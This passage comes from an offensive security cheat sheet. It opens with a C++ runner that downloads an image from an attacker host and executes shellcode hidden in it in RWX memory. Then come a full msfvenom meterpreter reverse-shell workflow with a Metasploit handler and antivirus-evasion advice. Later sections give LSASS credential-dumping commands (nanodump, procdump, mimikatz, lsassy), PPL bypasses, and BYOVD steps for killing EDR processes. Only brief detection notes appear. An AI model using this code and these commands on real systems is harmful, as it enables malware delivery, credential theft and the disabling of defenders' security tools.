const size_t shellcodeOffset = 36;   // from ImgPayload output

bool downloadImage(const char* url, const char* outputFile) {
    HINTERNET hInternet = InternetOpenA("ShellcodeRunner",
                           INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0,
                           INTERNET_FLAG_RELOAD, 0);
    std::ofstream outFile(outputFile, std::ios::binary);
    char buffer[4096]; DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead)
        outFile.write(buffer, bytesRead);
    InternetCloseHandle(hFile); InternetCloseHandle(hInternet);
    return true;
}

int main() {
    downloadImage(imageURL, imageFilename);
    std::ifstream file(imageFilename, std::ios::binary | std::ios::ate);
    std::streamsize fileSize = file.tellg(); file.seekg(0);
    std::vector<char> buffer(fileSize);
    file.read(buffer.data(), fileSize);

    size_t shellcodeSize = fileSize - shellcodeOffset;
    void* execMem = VirtualAlloc(nullptr, shellcodeSize,
                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(execMem, buffer.data() + shellcodeOffset, shellcodeSize);
    reinterpret_cast<void(*)()>(execMem)();   // execute shellcode
    return 0;
}
```

### Full Workflow

```
# 1. Generate shellcode:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o payload.bin

# 2. Embed in image:
python3 imgect.py --gif -f payload.bin -i legit.gif -o output.gif
# Note the reported shellcodeStart offset

# 3. Host the image:
python3 -m http.server 8080

# 4. Compile the runner with correct offset:
# Edit Runner.cpp: shellcodeOffset = <value from step 2>
# Edit Runner.cpp: imageURL = "http://10.10.14.5:8080/output.gif"
cl.exe /EHsc Runner.cpp wininet.lib
# OR cross-compile from Linux:
x86_64-w64-mingw32-g++ Runner.cpp -o runner.exe -lwininet

# 5. Start handler:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run"

# 6. Execute runner.exe on target — fetches image, extracts shellcode, executes
```

### AV Evasion Properties

```
# What this bypasses:
# - Static file signature scanning: runner.exe contains no shellcode bytes
# - URL reputation checks: image URL looks like a legitimate asset request
# - EXIF/GIF/BMP file format parsers used by some AV products may not
#   inspect bytes beyond the image end marker
# - LSB steganography is undetectable by standard AV (purely visual inspection)

# Detection risks remaining:
# - WinInet HTTP download from non-browser process (behavioral)
# - VirtualAlloc(PAGE_EXECUTE_READWRITE) in a process that handles image files
# - Memory scan after allocation: shellcode bytes in RWX region
#   Mitigate: RW alloc → copy → VirtualProtect RX
# - DNS/network request to untrusted host before shellcode execution

# Improving evasion:
# - XOR-encode shellcode in image (-k key): decodes only after download, no static match
# - Use EXIF injection: harder for AV to extract from JPEG EXIF fields
# - Serve image over HTTPS from a CDN (blend with normal traffic)
# - Use a named pipe or legitimate process for shellcode injection instead of self-exec
```

## LSASS Dump — EDR-Evading Techniques

Dumping LSASS (Local Security Authority Subsystem Service) memory extracts NTLM hashes and Kerberos tickets. EDR products heavily monitor LSASS access — standard Mimikatz/sekurlsa is detected by most modern EDR. These techniques reduce the detection signal.

```
# Direct syscall LSASS dump (bypasses userland hooks on OpenProcess/MiniDumpWriteDump):
# NanoDump — writes a minidump of LSASS using direct syscalls or BOF:
# github.com/helviojunior/nanodump
nanodump --write C:\Windows\Temp\lsass.dmp --valid
# --valid: adds valid minidump header so Mimikatz can parse offline

# ProcDump (Microsoft signed binary — LOLBin):
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
# Detection: CreateRemoteThread into LSASS is still flagged by most EDR

# Silentlydump (ntdll-based):
# Creates a snapshot of LSASS using NtCreateProcessEx syscall — no OpenProcess call

# NTDLS Cloning (bypass PPL — Process Protection Light):
# Clone the LSASS process to an unprotected process, then dump the clone
# Tool: PPLdump — github.com/itm4n/PPLdump
PPLdump.exe lsass.exe C:\temp\clone.dmp

# Token impersonation before dump (run as SYSTEM):
# Impersonate SYSTEM token → open LSASS without triggering user-context alerts
# Many EDR products monitor LSASS handle access from specific processes

# Parse LSASS dump offline (on attacker machine, not target):
# Avoids running Mimikatz on the target where AMSI/AV would catch it
mimikatz.exe "sekurlsa::minidump C:\temp\lsass.dmp" "sekurlsa::logonpasswords" exit

# Remote LSASS dump (Lsassy — Python):
# Dumps LSASS remotely via WMI, SMB, or other methods
lsassy -d corp.com -u admin -p 'Password123' -t 192.168.1.10
```

## Protected Process Light (PPL) Bypass

Windows PPL prevents even administrators from opening handles to protected processes like LSASS, Defender, and anti-cheat drivers. PPL bypass techniques use vulnerable kernel drivers to elevate to kernel and disable the protection flags.

```
# PPL levels (from highest to lowest):
# WinTcb-Light: LSASS (most protected in modern Windows)
# Windows-Light: Defender, some AV processes
# Authenticode-Light: Third-party AV, EDR agents

# PPLdump (itm4n) — exploits Windows error reporting to clone LSASS:
# github.com/itm4n/PPLdump
PPLdump.exe -v lsass.exe C:\temp\lsass.dmp
# Does NOT require a kernel driver — uses LSASS error report trick
# Works on: Windows 10/11 up to specific patch levels

# SharpPPL (C# PPL bypass):
# github.com/Am0nsec/SharpPPL
SharpPPL.exe --action dump --process lsass.exe --output C:\temp\lsass.dmp

# Kernel-level PPL bypass (BYOVD):
# Load a vulnerable signed driver → exploit to get kernel code execution
# Modify EPROCESS.Protection field to remove PPL flag for LSASS
# Then dump with standard MiniDumpWriteDump

# EDR agent protection bypass (target the EDR's PPL-protected process):
# If EDR agent runs as PPL → standard process kill/inject fails
# BYOVD → kernel access → disable PPL on EDR process → kill/inject
```

## BYOVD — Bring Your Own Vulnerable Driver

BYOVD uses a legitimate, Microsoft-signed but vulnerable kernel driver to achieve kernel-mode code execution. This bypasses kernel protections (PPL, DSE — Driver Signature Enforcement) and can kill EDR processes that are otherwise protected.

```
# BYOVD concept:
# 1. Find a vulnerable SIGNED driver (kernel vulnerability, IOCTL exploit)
# 2. Load it via sc.exe or NtLoadDriver (requires SeLoadDriverPrivilege → admin)
# 3. Exploit the driver via IOCTL calls to run kernel code
# 4. From kernel: disable PPL, kill EDR process, patch kernel callbacks

# loldrivers.io — database of vulnerable kernel drivers:
# Search: https://www.loldrivers.io/
# Filter by: kill capabilities, vulnerability type, detection status

# Common BYOVD drivers used in red team/ransomware:
# Process Kill:   gdrv.sys (GigaByte), RTCore64.sys (MSI), mhyprot2.sys (MiHoYo)
# Arbitrary write: speedfan.sys, KProcessHacker.sys (Process Hacker)
# EDR termination: TrueSight (RealBlind), IOBITUNLOCKER64.sys

# KDU (Kernel Driver Utility) — automates BYOVD for kernel driver attacks:
# github.com/hfiref0x/KDU
KDU.exe -list         # list supported vulnerable drivers
KDU.exe -prv 9        # use driver #9 (GigaByte gdrv.sys)
KDU.exe -dse 0        # disable Driver Signature Enforcement
KDU.exe -ps PID       # kill a process by PID (bypasses PPL)

# Terminating EDR process with BYOVD:
# 1. Identify EDR process name/PID: tasklist | findstr /i "defender crowd falcon"
# 2. Load vulnerable driver
# 3. Call IOCTL to kill EDR process
# 4. EDR is now dead, no further monitoring

# Detection by defenders:
# - Monitoring driver load events (Event ID 7045: new service installed)
# - Sysmon Event ID 6: driver loaded
# - Hashes of known malicious/vulnerable drivers (Defender's driver blocklist)
# - Microsoft's vulnerable driver blocklist: updated Windows Defender signatures
# Evasion: use recently discovered vulnerable drivers not yet in blocklist
```

## Resources

- SysWhispers2 — direct syscall generator — `github.com/jthuraisamy/SysWhispers2`
- SysWhispers3 — indirect syscall support — `github.com/klezVirus/SysWhispers3`
- HellsGate / HalosGate — syscall enumeration — `github.com/am0nsec/HellsGate`
- Hookchain — advanced unhooking — `github.com/helviojunior/hookchain`
- al-khaser — anti-VM/debug/sandbox test suite — `github.com/LordNoteworthy/al-khaser`
- PPLdump — PPL bypass without kernel driver — `github.com/itm4n/PPLdump`
- KDU — Kernel Driver Utility (BYOVD automation) — `github.com/hfiref0x/KDU`
- loldrivers.io — vulnerable driver database — `loldrivers.io`
- NanoDump — stealthy LSASS dump — `github.com/helviojunior/nanodump`
- ThreatCheck — identify Defender signature bytes — `github.com/rasta-mouse/ThreatCheck`
- Awesome EDR Bypass reference — `github.com/tkmru/awesome-edr-bypass`
- Cocomelonc malware dev blog — `cocomelonc.github.io`
